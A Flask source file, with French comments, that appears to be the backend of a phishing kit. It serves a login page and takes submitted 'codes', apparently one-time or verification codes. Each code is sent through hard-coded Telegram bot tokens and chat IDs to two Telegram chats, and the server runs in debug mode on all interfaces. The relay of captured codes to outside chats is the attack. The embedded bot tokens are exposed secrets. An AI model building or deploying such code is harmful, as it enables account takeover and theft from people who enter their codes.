from flask import Flask, request, jsonify, render_template
import requests

app = Flask(__name__)

# Bot 1
BOT_1_TOKEN = '7858273702:AAEMIDAD8ZwY_Y0iZliX-5YPXNoHCkeB9HQ'
BOT_1_CHAT_ID = '5214147917'

# Bot 2
BOT_2_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
BOT_2_CHAT_ID = '6297861735'

def send_telegram_message(bot_token, chat_id, message):
    return requests.post(
        f"https://api.telegram.org/bot{bot_token}/sendMessage",
        data={'chat_id': chat_id, 'text': message}
    )

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.get_json()
    print("Reçu :", data)

    code = data.get('code')
    if code:
        message = f"Code reçu : {code}"

        # Envoi au bot 1
        resp1 = send_telegram_message(BOT_1_TOKEN, BOT_1_CHAT_ID, message)
        print("Bot 1 Telegram:", resp1.text)

        # Envoi au bot 2
        resp2 = send_telegram_message(BOT_2_TOKEN, BOT_2_CHAT_ID, message)
        print("Bot 2 Telegram:", resp2.text)

        return jsonify({'status': 'success'}), 200
    else:
        return jsonify({'status': 'no code'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=True)
